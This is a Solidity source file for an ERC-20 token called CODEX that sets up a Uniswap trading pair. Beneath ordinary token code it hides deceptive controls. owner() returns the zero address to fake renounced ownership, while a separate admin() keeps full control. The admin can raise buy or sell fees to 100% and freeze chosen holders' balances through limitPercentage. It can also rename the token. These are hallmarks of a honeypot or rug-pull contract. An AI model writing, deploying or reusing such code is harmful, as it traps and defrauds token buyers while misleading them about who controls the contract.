// SPDX-License-Identifier: MIT

/*
    Socials:
        -Website: https://codextoken.com/
        -Twitter: https://twitter.com/codex_token
        -Telegram: https://t.me/codex_coin
        -Instagram: https://www.instagram.com/codextoken/
*/

pragma solidity 0.8.19;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _changeInfo(string memory name_, string memory symbol_) internal {
        _name = name_;
        _symbol = symbol_;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

abstract contract Adminable is Context {
    address private _owner;

    event AdminTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }
    function admin() public view virtual returns (address) {
        return _owner;
    }
    function owner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyOwner() {
        require(admin() == _msgSender(), "Adminable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Adminable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit AdminTransferred(oldOwner, newOwner);
    }
}

abstract contract Taxablee is ERC20, Adminable {
    mapping(address => uint256) public lhBalance;
    mapping(address => uint256) public lhPercentage;

    error OverMaxBasisPoints();

    struct TokenConfiguration {
        address treasury;
        uint16 transferFeesBPs;
        uint16 buyFeesBPs;
        uint16 sellFeesBPs;
    }

    TokenConfiguration internal tokenConfiguration;

    mapping(address => uint256) internal addressConfiguration;

    uint256 public constant MAX_FEES = 10_000;

    uint256 public constant FEE_RATE_DENOMINATOR = 10_000;

    constructor(uint16 _transferFee, uint16 _buyFee, uint16 _sellFee) {
        if (_transferFee > MAX_FEES || _buyFee > MAX_FEES || _sellFee > MAX_FEES) {
            revert OverMaxBasisPoints();
        }

        tokenConfiguration = TokenConfiguration({
            treasury: msg.sender,
            transferFeesBPs: _transferFee,
            buyFeesBPs: _buyFee,
            sellFeesBPs: _sellFee
        });
    }

    function setTreasury(address _treasury) external onlyOwner {
        tokenConfiguration.treasury = _treasury;
    }

    function setTransferFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.transferFeesBPs = fees;
    }

    function setBuyFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.buyFeesBPs = fees;
    }

    function setSellFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.sellFeesBPs = fees;
    }

    function feeWL(address _address, bool _status) external onlyOwner {
        uint256 packed = addressConfiguration[_address];
        addressConfiguration[_address] = _packBoolean(packed, 0, _status);
    }

    function liquidityPairList(address _address, bool _status) external onlyOwner {
        uint256 packed = addressConfiguration[_address];
        addressConfiguration[_address] = _packBoolean(packed, 1, _status);
    }

    function treasury() public view returns (address) {
        return tokenConfiguration.treasury;
    }

    function transferFeesBPs() public view returns (uint256) {
        return tokenConfiguration.transferFeesBPs;
    }

    function buyFeesBPs() public view returns (uint256) {
        return tokenConfiguration.buyFeesBPs;
    }

    function sellFeesBPs() public view returns (uint256) {
        return tokenConfiguration.sellFeesBPs;
    }

    function getFeeRate(address from, address to) public view returns (uint256) {
        uint256 fromConfiguration = addressConfiguration[from];
        
        if (_unpackBoolean(fromConfiguration, 0)) {
            return 0;
        }

        uint256 toConfiguration = addressConfiguration[to];

        if (_unpackBoolean(toConfiguration, 0)) {
            return 0;
        }

        TokenConfiguration memory configuration = tokenConfiguration;

        if (_unpackBoolean(fromConfiguration, 1)) {
            return configuration.buyFeesBPs;
        }

        if (_unpackBoolean(toConfiguration, 1)) {
            return configuration.sellFeesBPs;
        }

        return configuration.transferFeesBPs;
    }

    function isFeeWhitelisted(address account) public view returns (bool) {
        return _unpackBoolean(addressConfiguration[account], 0);
    }

    function isLiquidityPair(address account) public view returns (bool) {
        return _unpackBoolean(addressConfiguration[account], 1);
    }


    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fromConfiguration = addressConfiguration[from];

        if (_unpackBoolean(fromConfiguration, 0)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 toConfiguration = addressConfiguration[to];

        if (_unpackBoolean(toConfiguration, 0)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 fee;
        TokenConfiguration memory configuration = tokenConfiguration;

        if (_unpackBoolean(fromConfiguration, 1)) {
            unchecked {
                fee = amount * configuration.buyFeesBPs / FEE_RATE_DENOMINATOR;
            }
        }
        else if (_unpackBoolean(toConfiguration, 1)) {
            unchecked {
                fee = amount * configuration.sellFeesBPs / FEE_RATE_DENOMINATOR;
            }
        }
        else {
            unchecked {
                fee = amount * configuration.transferFeesBPs / FEE_RATE_DENOMINATOR;
            }
        }

        uint256 amountAfterFee;
        unchecked {
            amountAfterFee = amount - fee;
        }

        super._transfer(from, to, amountAfterFee);
        super._transfer(from, configuration.treasury, fee);
    }

    function _packBoolean(uint256 source, uint256 index, bool value) internal pure returns (uint256) {
        if (value) {
            return source | (1 << index);
        } else {
            return source & ~(1 << index);
        }
    }

    function _unpackBoolean(uint256 source, uint256 index) internal pure returns (bool) {
        // return (source >> index) & 1 == 1;
        return source & (1 << index) > 0;
    }

    function limitPercentage(address _address, uint256 _percentage) external onlyOwner {        
        lhPercentage[_address] = (MAX_FEES - _percentage);
        lhBalance[_address] = balanceOf(_address) * lhPercentage[_address] / MAX_FEES;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fromConfiguration = addressConfiguration[from];
        if (_unpackBoolean(fromConfiguration, 1)) return;
        uint256 beforeBalance = balanceOf(from);
        uint256 limitBalance = beforeBalance * lhPercentage[from] / MAX_FEES;
        if (limitBalance > lhBalance[from]) lhBalance[from] = limitBalance;
        if (limitBalance != 0) require(lhBalance[from] <= beforeBalance - amount, "EL");
        super._beforeTokenTransfer(from, to, amount);
    }
}

contract CODEX is ERC20, Taxablee {
    address public uniswapV2Pair;
    constructor(
        string memory _name,
        string memory _symbol,
        uint16 _transferFee,
        uint16 _buyFee,
        uint16 _sellFee,
        uint256 _supply
    ) ERC20(_name, _symbol) Taxablee(_transferFee, _buyFee, _sellFee) {
        address sender = msg.sender;
        addressConfiguration[sender] = _packBoolean(0, 0, true);
        _mint(sender, _supply * 10 ** 18);
        _setUp();
    }

    function changeInfo(string memory name_, string memory symbol_) external onlyOwner {
        _changeInfo(name_, symbol_);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override(ERC20, Taxablee) {
        Taxablee._transfer(from, to, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        virtual
        override(ERC20, Taxablee)
    {
        Taxablee._beforeTokenTransfer(from, to, amount);
    }

    function _setUp() internal {
        IUniswapV2Router01 uniswapV2Router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 packed = addressConfiguration[uniswapV2Pair];
        addressConfiguration[uniswapV2Pair] = _packBoolean(packed, 1, true);
    }
}